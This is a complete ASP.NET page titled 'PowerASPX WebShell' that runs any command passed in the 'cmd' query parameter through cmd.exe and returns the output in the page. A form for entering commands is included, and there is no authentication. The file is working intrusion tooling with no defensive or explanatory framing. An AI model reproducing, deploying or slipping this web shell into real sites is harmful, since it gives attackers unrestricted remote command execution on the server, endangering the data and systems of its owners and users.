<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>
<html><body><h2>PowerASPX WebShell</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
